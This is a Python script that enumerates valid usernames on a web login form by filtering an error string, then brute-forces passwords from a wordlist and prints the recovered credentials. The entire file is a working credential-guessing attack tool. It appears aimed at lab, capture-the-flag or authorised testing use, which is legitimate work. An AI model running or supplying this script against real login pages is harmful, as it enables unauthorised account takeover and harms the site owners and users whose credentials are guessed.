import requests
from termcolor import colored

url = input("[*] Input the URL : ")
neg_string = input("[*] Enter the string to Filter (case sensitive) : ")
usernames = open("usernames", "r")

for username in usernames:
    username = username.strip()
    r = requests.post(url, data={'username': username , 'password': 'pass'})
    print(username, end=' ===> ')
    print(r.status_code, end=' ===> ')
    if (neg_string in r.text):
        print(colored("[-] Negative string present...", "red"))
    else:
        print(colored("[+] Possible Username found : "+username, "green"))
        break

usernames.close()

print("--- Trying passwords with the found username ---")

passwords = open("passwords", "r")

for password in passwords:
    password = password.strip()
    r = requests.post(url, data={'username': username , 'password': password})
    print(password, end=" ===> ")
    print(r.status_code)
    if (r.status_code!=200):
        print(colored("[+] Password Found : "+password, "green"))
        break

passwords.close()

print("--- Credentials ---")
print("[+] Username : "+username)
print("[+] Password : "+password )